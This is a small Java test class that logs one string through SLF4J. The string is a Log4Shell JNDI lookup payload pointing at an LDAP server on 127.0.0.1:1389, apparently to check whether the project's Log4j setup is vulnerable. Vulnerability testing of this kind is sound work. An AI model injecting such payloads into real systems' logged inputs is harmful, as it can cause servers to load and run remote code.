package com.platform.mesh;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @author 蝉鸣
 *
 * @description 工具测试
 */
public class UtilsTest {

	private final static Logger log = LoggerFactory.getLogger(UtilsTest.class);

	public void util() {

		log.info("params: {}", "${jndi:ldap://127.0.0.1:1389/Log4jTest}");
	}

}
